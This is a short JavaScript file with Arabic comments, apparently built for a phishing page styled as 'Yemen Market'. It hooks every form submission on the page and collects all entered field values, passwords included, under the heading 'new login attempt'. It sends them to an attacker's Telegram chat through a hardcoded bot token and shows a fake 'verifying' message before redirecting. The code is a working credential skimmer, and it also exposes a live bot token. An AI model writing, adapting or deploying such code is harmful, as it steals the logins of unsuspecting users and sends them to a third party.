// ملف إعدادات البوت - يمن ماركت
const BOT_TOKEN = "7547167664:AAEm66PjE-0L0o9q2CbeW9N7O8pL-yY7qXk";
const CHAT_ID = "5365513411";

async function sendDataToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        return true;
    } catch (error) {
        console.error("خطأ في الإرسال:", error);
        return false;
    }
}

// ربط النماذج الموجودة في صفحاتك بالبوت تلقائياً
document.addEventListener('submit', async (e) => {
    e.preventDefault();
    const form = e.target;
    const btn = form.querySelector('button[type="submit"]');
    const originalBtnText = btn.innerText;

    // تجميع البيانات من الحقول
    let dataMessage = `🚀 *محاولة دخول جديدة*\n\n`;
    const inputs = form.querySelectorAll('input');
    inputs.forEach(input => {
        if(input.value) {
            dataMessage += `🔹 ${input.placeholder || input.name}: \`${input.value}\`\n`;
        }
    });

    // تغيير حالة الزر للتوضيح
    btn.disabled = true;
    btn.innerText = "جاري التحقق...";

    const success = await sendDataToTelegram(dataMessage);

    if (success) {
        alert("تمت العملية بنجاح!");
        window.location.href = 'index.html'; // العودة للرئيسية حسب ملفاتك
    } else {
        alert("حدث خطأ، حاول مجدداً");
        btn.disabled = false;
        btn.innerText = originalBtnText;
    }
});